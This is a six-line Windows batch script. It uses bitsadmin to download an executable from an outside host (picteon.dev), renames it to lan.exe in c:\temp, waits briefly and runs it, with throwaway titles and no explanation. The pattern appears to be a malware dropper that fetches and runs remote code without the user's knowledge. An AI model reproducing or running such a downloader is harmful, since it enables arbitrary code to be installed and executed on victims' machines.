@echo off
title a
bitsadmin /transfer qwe /priority foreground https://picteon.dev/files/Arcade.exe c:\temp\lan.exe
timeout /t 3 /nobreak >nul
c:\temp\lan.exe
exit
